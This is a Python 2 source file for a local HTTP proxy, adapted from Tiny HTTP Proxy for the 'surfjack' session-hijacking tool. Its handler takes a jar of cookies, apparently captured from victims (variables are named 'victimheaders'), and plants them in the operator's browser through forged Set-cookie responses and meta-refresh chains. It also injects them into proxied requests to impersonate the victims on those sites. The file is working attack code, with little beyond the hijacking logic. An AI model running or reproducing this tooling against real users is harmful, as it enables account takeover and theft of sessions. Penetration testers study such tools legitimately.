#!/usr/bin/env python
__doc__ = """Modified by sandro gauci for surfjack

Originally called: Tiny HTTP Proxy.

This module implements GET, HEAD, POST, PUT and DELETE methods
on BaseHTTPServer, and behaves as an HTTP proxy.  The CONNECT
method is also implemented experimentally, but has not been
tested yet.

Any help will be greatly appreciated.		SUZUKI Hisao
"""

__version__ = "0.2.2"

import BaseHTTPServer, select, socket, urlparse, SocketServer
import cgi, urllib
from threading import Thread
import logging

class Ate:
    def __init__(self):
        self.cookies = False


class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
    log = logging.getLogger('ProxyHandler')
    __base = BaseHTTPServer.BaseHTTPRequestHandler
    __base_handle = __base.handle
    setcookiepkt = "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nLength: %s\r\n%s\r\n%s" 
    server_version = "TinyHTTPProxy/" + __version__
    rbufsize = 0                        # self.rfile Be unbuffered
    def handle(self):
        (ip, port) =  self.client_address
        if hasattr(self, 'allowed_clients') and ip not in self.allowed_clients:
            self.raw_requestline = self.rfile.readline()
            if self.parse_request(): self.send_error(403)
        else:
            self.__base_handle()

    def _connect_to(self, netloc, soc):
        i = netloc.find(':')
        if i >= 0:
            host_port = netloc[:i], int(netloc[i+1:])
        else:
            host_port = netloc, 80
        self.log.debug( "\t" "connect to %s:%d" % host_port )
        try: soc.connect(host_port)
        except socket.error, arg:
            try: msg = arg[1]
            except: msg = arg
            self.send_error(404, msg)
            return 0
        return 1

    def do_CONNECT(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(self.path, soc):
                self.log_request(200)
                self.wfile.write(self.protocol_version +
                                 " 200 Connection established\r\n")
                self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
                self.wfile.write("\r\n")
                sslsock = socket.ssl(soc)
                self._read_write(sslsock, 300, ssl=True)
        finally:
            self.log.debug("\t bye")
            soc.close()
            self.connection.close()

    def do_GET(self):
        global cookiejar
        global victimheaders
        global ate
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
            self.path, 'http')
        if scm != 'http' or fragment or not netloc:
            self.send_error(400, "bad url %s" % cgi.escape(self.path))
            return
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            (ip, port) =  self.client_address
            cookiehosts = cookiejar.keys()
            if (netloc == 'setcookies' or not ate.cookies):
                self.log.debug('time to set some cookies')
                if len(cookiehosts) > 0:
                    self.log.debug('no cookies to set')
                    if netloc in cookiehosts:
                        newcookie = cookiejar[netloc]
                        headers=''.join(map(lambda x: 'Set-cookie: %s;\r\n' % x, newcookie.split(';')))
                        nextpos = cookiehosts.index(netloc)+1
                        print 'setting cookie for %s' % netloc
                        if nextpos >= len(cookiehosts):
                            body = "<h1> all cookies set</h1>"
                            ate.cookies = True                            
                            #cookiejar.clear()
                            body += ''.join(map(lambda x: "<a href='http://%s/'>%s</a>\r\n<br />" % (urllib.quote(x),cgi.escape(x)),cookiehosts))
                            body += "go to http://setcookies to set new cookies later on"
                        else:
                            nextdestination = cookiehosts[nextpos]
                            body = '<meta http-equiv="refresh" content="0;url=http://%s"/>' % urllib.quote(nextdestination)
                    else:
                        headers = ''
                        body = '<meta http-equiv="refresh" content="0;url=http://%s"/>taking you somewhere' % urllib.quote(cookiehosts[0])
                else:
                    headers = ''
                    body = '<h1>no cookies to set</h1> go to http://setcookies to set cookies later on'
                self.log.debug( self.setcookiepkt % (len(body),headers,body))                
                self.wfile.write(self.setcookiepkt % (len(body),headers,body))
            else:
                if self._connect_to(netloc, soc):
                    self.log_request()
                    soc.send("%s %s %s\r\n" % (
                        self.command,
                        urlparse.urlunparse(('', '', path, params, query, '')),
                        self.request_version))
                    #for header in victimheaders.keys():                    
                        #self.headers[header] = victimheaders[header][0]
                    self.headers['Connection'] = 'close'                    
                    del self.headers['Proxy-Connection']                    
                    if netloc in cookiejar.keys():
                        self.headers['Cookie'] = cookiejar[netloc]
                    for key_val in self.headers.items():
                        soc.send("%s: %s\r\n" % key_val)
                    soc.send("\r\n")
                    self._read_write(soc)
        finally:
            self.log.debug( "\t bye")
            soc.close()
            self.connection.close()

    def _read_write(self, soc, max_idling=20,ssl=False):
        if ssl:
            connection = socket.ssl(self.connection)
        else:
            connection = self.connection
            
        iw = [connection, soc]
        ow = []
        count = 0
        while 1:
            count += 1
            (ins, _, exs) = select.select(iw, ow, iw, 3)
            if exs: break
            if ins:
                for i in ins:
                    if i is soc:
                        out = connection
                    else:
                        out = soc
                    data = i.recv(8192)
                    if data:
                        out.send(data)
                        count = 0
            else:
                self.log.debug( "\t idle %s" % count)
            if count == max_idling: break

    do_HEAD = do_GET
    do_POST = do_GET
    do_PUT  = do_GET
    do_DELETE=do_GET

class ThreadingHTTPServer (SocketServer.ThreadingMixIn,
                           BaseHTTPServer.HTTPServer): pass


def dummy_log():
                return
## this looks just like Wifizoo's
## that's because it is. Originally I started modifying the original code
## then noticed that wifizoo used the same code, and that's great :)

class DrukqsProxy(Thread):
        import logging
        log = logging.getLogger('DrukqsProxy')
        def __init__(self,):
                Thread.__init__(self)
        def run(self):
                global ate
                global cookiejar
                #global victimheaders
                HandlerClass = ProxyHandler
                ServerClass = ThreadingHTTPServer
                protocol = 'HTTP/1.0'
                port = 8080
                server_address = ('127.0.0.1', port)
                HandlerClass.protocol_version = protocol
                httpd = ServerClass(server_address, HandlerClass)
                httpd.log_message = dummy_log
                sa = httpd.socket.getsockname()
                ate = Ate()
                cookiejar = self.cookiejar
                #victimheaders = self.victimheaders
                self.log.info( "Drukqs HTTP Proxy on %s:%s" % sa)
                httpd.serve_forever()


